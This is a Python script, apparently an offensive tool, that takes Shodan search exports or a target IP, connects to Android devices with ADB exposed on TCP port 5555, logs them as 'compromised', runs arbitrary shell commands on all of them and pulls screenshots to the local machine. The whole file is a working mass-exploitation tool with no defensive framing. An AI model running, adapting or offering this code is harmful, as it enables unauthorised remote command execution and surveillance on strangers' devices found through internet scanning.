#!/usr/bin/env python3
import json
import logging
import os
from pathlib import Path
from subprocess import PIPE, Popen

logo_design_4 = '''
    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
'''
print(logo_design_4)

DEFAULT_ADB_PORT = 5555
DEFAULT_DEVICES_FILE = 'devices.txt'
DEFAULT_SCREENSHOT_DIR = 'screenshots'
Path(DEFAULT_SCREENSHOT_DIR).mkdir(exist_ok=True)


def get_arguments():
    from argparse import ArgumentParser

    parser = ArgumentParser()
    parser.add_argument('--target-ip',
                        dest='ip',
                        required=False,
                        help='An IP address of the android device')
    parser.add_argument('--target-port',
                        dest='port',
                        default=DEFAULT_ADB_PORT,
                        required=False,
                        help='A TCP port of the remote ADB service. Default is ' + str(DEFAULT_ADB_PORT))
    parser.add_argument('--shodan-file',
                        dest='shodan_file',
                        required=False,
                        help='A file with Shodan export in JSON format. '
                             'JSON entries must be separated with a new-line character.')
    parser.add_argument('--devices-file',
                        dest='devices_file',
                        default=DEFAULT_DEVICES_FILE,
                        required=False,
                        help='A new-line separated txt file with stored IP addresses of connected android devices to '
                             'add them to the tool\'s context, '
                             'in the following format: IP_ADDRESS:PORT.')
    parser.add_argument('-x',
                        '--execute',
                        dest='execute',
                        required=False,
                        help='Execute a given command on the compromised android device(s)')
    parser.add_argument('--screenshot',
                        action='store_true',
                        required=False,
                        help='Capture a screenshot from the compromised android device(s).')
    parser.add_argument('-l',
                        '--logging',
                        dest='logging',
                        default='INFO',
                        required=False,
                        help='Logging level. Default is INFO')
    options = parser.parse_args()

    return options


def is_stored(ip_address, devices_file):
    with open(devices_file, 'r') as f:
        if any(ip_address in line for line in f.readlines()):
            return True


def store_connected_device(ip_address, port, devices_file):
    if os.path.exists(devices_file) and is_stored(ip_address, devices_file):
        return
    with open(devices_file, 'a') as f:
        f.write(f'{ip_address}:{port}')
        f.write(os.linesep)


class AndroidDevice:
    def __init__(self, ip_address, port, devices_file):
        self.ip_address = ip_address
        self.port = str(port)
        self.devices_file = devices_file
        self.is_connected = False

    def connect(self):
        if self.is_connected:
            logging.debug('%s is already connected', self.ip_address)
            return
        try:
            with Popen(['adb', 'connect', f'{self.ip_address}:{self.port}'],
                       stdout=PIPE,
                       stderr=PIPE) as process:
                stdout, stderr = process.communicate()
                if stdout:
                    if 'connected' in str(stdout):
                        logging.debug('Connected to %s:%s', self.ip_address, self.port)
                        self.is_connected = True
                        store_connected_device(self.ip_address, self.port, self.devices_file)
                if stderr:
                    if 'refused' in str(stderr).lower():
                        logging.debug('%s - connection refused', self.ip_address)
                    elif 'out' in str(stderr).lower():
                        logging.debug('%s - connection timed out', self.ip_address)
        except Exception as e:
            logging.error('%s - %s', self.ip_address, e)

    def execute(self, command):
        if not self.is_connected:
            logging.debug('%s is not connected', self.ip_address)
        try:
            with Popen(['adb', '-s', f'{self.ip_address}:{self.port}', 'shell', command],
                       stdout=PIPE,
                       stderr=PIPE) as process:
                stdout, stderr = process.communicate()
                if stdout:
                    print(stdout)
                if stderr:
                    print(stderr)
        except Exception as e:
            logging.error('%s -%s', self.ip_address, e)

    def get_screenshot(self):
        if not self.is_connected:
            logging.debug('%s is not connected', self.ip_address)
        screenshot_remote_file_name = '/sdcard/screen.png'
        try:
            with Popen(['adb', '-s', f'{self.ip_address}:{self.port}', 'shell', 'screencap',
                        screenshot_remote_file_name],
                       stdout=PIPE,
                       stderr=PIPE) as process:
                process.communicate()
            screenshot_local_file_name = Path(
                        # _datetime.now():%d%m%y_%H%M
                        DEFAULT_SCREENSHOT_DIR) / f'{self.ip_address}.png'
            with Popen(['adb', '-s', f'{self.ip_address}:{self.port}', 'pull',
                        screenshot_remote_file_name,
                        screenshot_local_file_name],
                       stdout=PIPE, stderr=PIPE) as process:
                stdout, stderr = process.communicate()
                if stdout:
                    logging.debug('Captured a screenshot to %s from %s:%s',
                                  screenshot_local_file_name, self.ip_address, self.port)
                if stderr:
                    logging.debug('Failed to download a screenshot from %s: %s', self.ip_address, stderr)
        except Exception as e:
            logging.error('%s - %s', self.ip_address, e)


options = get_arguments()

logging.basicConfig(format='[%(asctime)s %(levelname)s]: %(message)s',
                    datefmt='%m/%d/%Y %I:%M:%S %p',
                    level=options.logging)

connected_devices_file_name = options.devices_file
android_devices = []
if options.ip:
    android_devices = [AndroidDevice(ip_address=options.ip,
                                     port=options.port,
                                     devices_file=connected_devices_file_name)]
elif options.shodan_file:
    file_name = options.shodan_file
    logging.info('Reading %s', file_name)
    with open(file_name, 'r') as f:
        try:
            for line in f.readlines():
                dump = json.loads(line)
                device = AndroidDevice(ip_address=dump['ip_str'],
                                                     port=dump['port'],
                                                     devices_file=connected_devices_file_name)
                device.connect()
                if device.is_connected:
                    android_devices.append(device)
        except Exception as e:
            logging.error(e)
elif os.path.exists(connected_devices_file_name):
    logging.info('Attempting to reconnect android devices from the stored %s file', connected_devices_file_name)
    with open(connected_devices_file_name, 'r') as f:
        lines = [line.strip() for line in f.readlines()]
        for i, line in enumerate(lines):
            ip_address = line.split(':')[0]
            port = line.split(':')[1]
            logging.info('Reconnecting %s:%s [%s/%s]', ip_address, port, i, len(lines))
            device = AndroidDevice(ip_address=ip_address,
                                   port=port,
                                   devices_file=connected_devices_file_name)
            device.connect()
            if device.is_connected:
                android_devices.append(device)

if android_devices:
    os.system("adb tcpip 5555")
    logging.info('%s android devices have been passed for exploitation', len(android_devices))
    for i, device in enumerate([device for device in android_devices if not device.is_connected]):
        logging.info('Connecting to %s:%s [%s/%s]', device.ip_address, device.port, i, len(android_devices))
        device.connect()
    connected_android_devices = [device for device in android_devices if device.is_connected]
    if connected_android_devices:
        os.system('sleep 3')
        logging.info('%s android devices have been connected', len(connected_android_devices))

        if options.execute:
            command = options.execute
            for i, device in enumerate(connected_android_devices):
                logging.info('Executing %s on %s:%s [%s/%s]', command, device.ip_address, device.port, i,
                             len(connected_android_devices))
                device.execute(command)
        if options.screenshot:
            for i, device in enumerate(connected_android_devices):
                logging.info('Capturing a screenshot on %s:%s [%s/%s]', device.ip_address, device.port, i,
                             len(connected_android_devices))
                device.get_screenshot()
